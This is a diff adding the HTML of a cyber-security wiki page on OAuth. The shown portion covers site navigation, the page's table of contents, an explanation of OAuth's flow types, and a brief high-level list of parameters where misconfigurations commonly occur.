@@ -1,0 +1,2173 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="OAuth (Open Authorization) # OAuth is a way for an application to access a user’s data on another service without knowing the user’s password, by using temporary tokens that grant limited, controlled permissions.
+Fundamentals Of OAuth # OAuth is built on the idea of delegated authorization — a user allows one application to access specific resources on their behalf using tokens instead of passwords.
+Client application — The website or app that wants to access user data.">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="OAuth (Open Authorization)" />
+<meta property="og:description" content="OAuth (Open Authorization) # OAuth is a way for an application to access a user’s data on another service without knowing the user’s password, by using temporary tokens that grant limited, controlled permissions.
+Fundamentals Of OAuth # OAuth is built on the idea of delegated authorization — a user allows one application to access specific resources on their behalf using tokens instead of passwords.
+Client application — The website or app that wants to access user data." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/OAuth-Cheatsheet/" /><meta property="article:section" content="docs" />
+
+<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
+<title>OAuth (Open Authorization) | Cyber Security Wiki</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
+    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Application Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
+    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Thick Client</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/checklist/" class="">Checklist</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_linux/" class="">Learning Process - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_windows/" class="">Learning Process - Windows</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_linux/" class="">Tools - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_windows/" class="">Tools - Windows</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
+    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Vulnerable Applications</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/Api/" class="">API</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/WebApp/" class="">Web App</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
+    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Web</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Account-Takeover/" class="">Account Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Access-Control/" class="">Broken Access Control</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Function-Level-Authorization-BFLA/" class="">Broken Function Level Authorization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Buffer-Overflow/" class="">Buffer Overflow</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Business-logic-Vulnerabilities/" class="">Business Logic</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/charset-xss/" class="">Charset XSS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Clickjacking/" class="">Clickjacking</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Client-Side-Template-Injection-CSTI/" class="">Client Side Template Injection (CSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CORS/" class="">CORS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Credential-Stuffing/" class="">Credential Stuffing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CRLF-Injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Request-Forgery-CSRF/" class="">Cross-Site Request Forgery (CSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Scripting-XSS/" class="">Cross-Site Scripting (XSS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CSV-Injection/" class="">CSV Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Denial-of-Service-DOS/" class="">Denial of Service (DOS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/DOM-Clobbering/" class="">DOM Clobbering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/GraphQL/" class="">GraphQL</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Host-Header-Injection/" class="">HTTP Host Header Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Request-Smuggling/" class="">HTTP Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Identification-and-Authentication-Failures/" class="">Identification and Authentication Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Disclosure/" class="">Information Disclosure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Gathering/" class="">Information Gathering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Deserialization/" class="">Insecure Deserialization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Direct-Object-Reference-IDOR/" class="">Insecure Direct Object Reference (IDOR)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insufficient-Transport-Layer-Protection/" class="">Insufficient Transport Layer Protection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/JWT/" class="">JWT</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/LDAP-Injection/" class="">LDAP Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Mass-Assignment/" class="">Mass Assignment</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/MFA-Bypass/" class="">Multi-Factor Authentication (MFA) Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/NoSQL-Injection/" class="">NoSQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/OAuth-Cheatsheet/" class=" active">OAuth (Open Authorization)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Open-Redirect/" class="">Open Redirect</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Padding-Oracle-Attacks/" class="">Padding Oracle Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Privilege-Escalation-Horizontal-Vertical/" class="">Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Prototype-Pollution/" class="">Prototype Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Race-Conditions/" class="">Race Conditions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Rate-Limiting/" class="">Rate Limiting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Registration-Signup-Logic-Flaws/" class="">Registration / Signup Logic Flaws</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Logging-and-Monitoring-Failures/" class="">Security Logging and Monitoring Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Misconfiguration/" class="">Security Misconfiguration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Sensitive-Data-Exposure/" class="">Sensitive Data Exposure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Request-Forgery-SSRF/" class="">Server-Side Request Forgery (SSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Template-Injection-SSTI/" class="">Server-Side Template Injection (SSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Session-Management-Weaknesses/" class="">Session Management Weaknesses</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Software-Data-Integrity-Failures/" class="">Software &amp; Data Integrity Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Subdomain-Takeover/" class="">Subdomain Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Third-party-service-integration-issues/" class="">Third party service integration issues</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Token-Predictability-Issues-Cheatsheet/" class="">Token Predictability / Poor Randomness</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Unrestricted-Resource-Consumption/" class="">Unrestricted Resource Consumption</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Vulnerable-Outdated-Components/" class="">Vulnerable &amp; Outdated Components</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-Cryptography-Implementation/" class="">Weak Cryptography Implementation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-SSL-TLS-Configurations/" class="">Weak SSL/TLS Configurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Deception/" class="">Web Cache Deception</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Poisoning/" class="">Web Cache Poisoning</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XPath-Injection/" class="">XPath Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XXE-XML-External-Entities/" class="">XXE (XML External Entities)</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
+    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Cloud Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
+    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">DevSecOps</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
+    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Exploit Development</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
+    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">IoT Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
+    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Machine Learning</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/machine-learning/learning/" class="">Learning Process</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
+    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Network</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
+    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Red Teaming</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
+    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Threat Modelling</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+<hr>
+<b>
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/contribute/" >
+        Contribute
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://securecode.wiki" target="_blank" rel="noopener">
+        Secure Code Wiki by Payatu
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</b>
+</nav>
+
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>OAuth (Open Authorization)</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#oauth-open-authorization">OAuth (Open Authorization)</a>
+      <ul>
+        <li><a href="#fundamentals-of-oauth">Fundamentals Of OAuth</a></li>
+        <li><a href="#the-types-of-oauth-flows">The types of Oauth Flows:</a>
+          <ul>
+            <li><a href="#1-authorization-code-flow">1. Authorization Code Flow</a></li>
+            <li><a href="#2-authorization-code-flow-with-pkce">2. <strong>Authorization Code Flow with PKCE</strong></a></li>
+            <li><a href="#3-implicit-flow">3. Implicit flow</a></li>
+            <li><a href="#4-client-credentials-flow"><strong>4.</strong> Client Credentials Flow</a></li>
+            <li><a href="#5-resource-owner-password-credentials-ropc-flow">5. Resource Owner Password Credentials (ROPC) Flow</a></li>
+            <li><a href="#6-device-authorization-flow-device-code-flow">6. Device Authorization Flow (Device Code Flow)</a></li>
+          </ul>
+        </li>
+        <li><a href="#oauth-attack-surface">OAuth Attack Surface</a></li>
+        <li><a href="#exploiting-oauth">Exploiting OAuth</a>
+          <ul>
+            <li><a href="#1-authentication-bypass-via-oauth-implicit-flow">1. Authentication Bypass via OAuth Implicit Flow</a></li>
+            <li><a href="#2-oauth-account-hijacking-via-redirect_uri-manipulation">2. OAuth Account Hijacking via <code>redirect_uri</code> Manipulation</a></li>
+            <li><a href="#3-forced-oauth-profile-linking">3. Forced OAuth Profile Linking</a></li>
+            <li><a href="#4-stealing-oauth-access-tokens-via-open-redirect">4. Stealing OAuth Access Tokens via Open Redirect</a></li>
+            <li><a href="#5-stealing-oauth-access-tokens-via-proxy-page">5. Stealing OAuth Access Tokens via Proxy Page</a></li>
+            <li><a href="#6-ssrf-via-openid-dynamic-client-registration">6. SSRF via OpenID Dynamic Client Registration</a></li>
+            <li><a href="#7-login-csrf-via-missing-state-parameter">7. Login CSRF via Missing <code>state</code> Parameter</a></li>
+            <li><a href="#8-authorization-code-replay">8. Authorization Code Replay</a></li>
+            <li><a href="#9-oauth-token-substitution-attack">9. OAuth Token Substitution Attack</a></li>
+            <li><a href="#10-email-trust-abuse-in-oauth-login">10. Email Trust Abuse in OAuth Login</a></li>
+            <li><a href="#11-id-token-claim-manipulation-oidc">11. ID Token Claim Manipulation (OIDC)</a></li>
+            <li><a href="#12-missing-pkce-leading-to-code-interception">12. Missing PKCE Leading to Code Interception</a></li>
+            <li><a href="#13-refresh-token-reuse-without-rotation">13. Refresh Token Reuse Without Rotation</a></li>
+            <li><a href="#14-oauth-discovery-endpoint-poisoning">14. OAuth Discovery Endpoint Poisoning</a></li>
+            <li><a href="#15-client-impersonation-via-leaked-client-credentials">15. Client Impersonation via Leaked Client Credentials</a></li>
+          </ul>
+        </li>
+        <li><a href="#oauth-bypasses--obfuscation">OAuth Bypasses &amp; Obfuscation</a>
+          <ul>
+            <li><a href="#1-redirect_uri-bypass-techniques">1. <code>redirect_uri</code> Bypass Techniques</a></li>
+            <li><a href="#2-state-parameter-bypass">2. State Parameter Bypass</a></li>
+            <li><a href="#3-scope-escalation">3. Scope Escalation</a></li>
+          </ul>
+        </li>
+        <li><a href="#additional-advanced-attack-scenarios">Additional Advanced Attack Scenarios</a>
+          <ul>
+            <li><a href="#1-pkce-downgrade-attack">1. PKCE Downgrade Attack</a></li>
+            <li><a href="#2-oauth-logout-csrf">2. OAuth Logout CSRF</a></li>
+            <li><a href="#3-token-leakage-via-referer-header">3. Token Leakage via Referer Header</a></li>
+            <li><a href="#4-framework-specific-misconfigurations">4. Framework-Specific Misconfigurations</a></li>
+          </ul>
+        </li>
+        <li><a href="#test-cases">Test Cases</a></li>
+        <li><a href="#detection-techniques">Detection Techniques</a>
+          <ul>
+            <li><a href="#a-manual-detection">A. Manual Detection</a></li>
+            <li><a href="#b-automated-detection">B. Automated Detection</a></li>
+          </ul>
+        </li>
+        <li><a href="#impact-of-oauth--sso-attacks">Impact of OAuth &amp; SSO Attacks</a></li>
+        <li><a href="#remediation-for-oauth--sso-vulnerabilities">Remediation for OAuth &amp; SSO Vulnerabilities</a></li>
+        <li><a href="#mitigation--prevention">Mitigation &amp; Prevention</a></li>
+        <li><a href="#good-to-read">Good To Read</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="oauth-open-authorization">
+  OAuth (Open Authorization)
+  <a class="anchor" href="#oauth-open-authorization">#</a>
+</h1>
+<p>OAuth is a way for an application to access a user’s data on another service <strong>without knowing the user’s password</strong>, by using <strong>temporary tokens</strong> that grant limited, controlled permissions.</p>
+<h2 id="fundamentals-of-oauth">
+  Fundamentals Of OAuth
+  <a class="anchor" href="#fundamentals-of-oauth">#</a>
+</h2>
+<p>OAuth is built on the idea of <strong>delegated authorization</strong> — a user allows one application to access specific resources on their behalf using <strong>tokens instead of passwords</strong>.</p>
+<ul>
+<li><strong>Client application</strong> — The website or app that wants to access user data.</li>
+<li><strong>Resource owner</strong> — The user whose data is being accessed.</li>
+<li><strong>OAuth service provider</strong> — Controls the data and grants tokens via an authorization and resource server.</li>
+</ul>
+<blockquote>
+<p><strong>OAuth vs SSO vs OIDC (Quick Reference)</strong></p>
+<ul>
+<li><strong>OAuth</strong> → How access is granted (tokens + permissions)</li>
+<li><strong>SSO</strong> → The login experience (one login, many apps)</li>
+<li><strong>OIDC</strong> → Authentication pattern built on top of OAuth</li>
+</ul>
+</blockquote>
+<h2 id="the-types-of-oauth-flows">
+  The types of Oauth Flows:
+  <a class="anchor" href="#the-types-of-oauth-flows">#</a>
+</h2>
+<ol>
+<li>Authorization Code Flow</li>
+<li>Authorization Code Flow with PKCE</li>
+<li>Implicit Flow (deprecated)</li>
+<li>Client Credentials Flow</li>
+<li>Resource Owner Password Credentials (ROPC) Flow</li>
+<li>Device Authorization Flow (Device Code Flow)</li>
+</ol>
+<blockquote>
+<p>⚠️ <strong>Implicit Flow is deprecated</strong> in OAuth 2.1. Always prefer Authorization Code + PKCE for SPAs and mobile apps.</p>
+</blockquote>
+<h3 id="1-authorization-code-flow">
+  1. Authorization Code Flow
+  <a class="anchor" href="#1-authorization-code-flow">#</a>
+</h3>
+<p><strong>Authorization Code Flow</strong> is an OAuth flow where a user logs in, the authorization server returns a short-lived <strong>authorization code</strong>, and the application’s backend exchanges that code for an <strong>access token</strong>.</p>
+<p>User authenticates → app gets a temporary code → backend swaps the code for tokens.</p>
+<h3 id="2-authorization-code-flow-with-pkce">
+  2. <strong>Authorization Code Flow with PKCE</strong>
+  <a class="anchor" href="#2-authorization-code-flow-with-pkce">#</a>
+</h3>
+<p><strong>Authorization Code Flow with PKCE</strong> is a secure version of the Authorization Code Flow where the app adds a cryptographic proof (called a <code>code_verifier</code>) to prevent authorization code interception.</p>
+<p>User logs in → app gets a temporary authorization code → app must prove it originally requested that code (using PKCE) before exchanging it for tokens.</p>
+<h3 id="3-implicit-flow">
+  3. Implicit flow
+  <a class="anchor" href="#3-implicit-flow">#</a>
+</h3>
+<p><strong>Implicit Flow is an OAuth 2.0 grant type where the access token is returned directly to the browser instead of first issuing an authorization code.</strong></p>
+<p>User logs in → authorization server immediately returns an access token in the browser URL.</p>
+<h3 id="4-client-credentials-flow">
+  <strong>4.</strong> Client Credentials Flow
+  <a class="anchor" href="#4-client-credentials-flow">#</a>
+</h3>
+<p><strong>Client Credentials Flow</strong> is an OAuth 2.0 flow where an application obtains an access token using its own credentials, without any user involvement.</p>
+<h3 id="5-resource-owner-password-credentials-ropc-flow">
+  5. Resource Owner Password Credentials (ROPC) Flow
+  <a class="anchor" href="#5-resource-owner-password-credentials-ropc-flow">#</a>
+</h3>
+<p><strong>Resource Owner Password Credentials (ROPC) Flow</strong> is an OAuth 2.0 flow where the user provides their <strong>username and password directly to the application</strong>, and the application sends those credentials to the authorization server to obtain an access token.</p>
+<p>User gives username and password to the app → app forwards them to the token endpoint → server returns an access token.</p>
+<h3 id="6-device-authorization-flow-device-code-flow">
+  6. Device Authorization Flow (Device Code Flow)
+  <a class="anchor" href="#6-device-authorization-flow-device-code-flow">#</a>
+</h3>
+<p><strong>Device Authorization Flow (Device Code Flow)</strong> is an OAuth 2.0 flow designed for devices that have limited input capability, like smart TVs or CLI tools.</p>
+<p>The device shows the user a code → the user visits a verification URL on another device (like a phone or laptop) → logs in and approves access → the original device receives an access token.</p>
+<h2 id="oauth-attack-surface">
+  OAuth Attack Surface
+  <a class="anchor" href="#oauth-attack-surface">#</a>
+</h2>
+<p>Common areas to look for OAuth misconfigurations:</p>
+<ul>
+<li><strong><code>redirect_uri</code> parameter</strong> — Open redirect / token hijacking</li>
+<li><strong><code>state</code> parameter</strong> — Missing or predictable = CSRF</li>
+<li><strong><code>scope</code> parameter</strong> — Scope escalation by modifying the request</li>
+<li><strong><code>response_type</code> parameter</strong> — Downgrade attacks (e.g., code → token)</li>
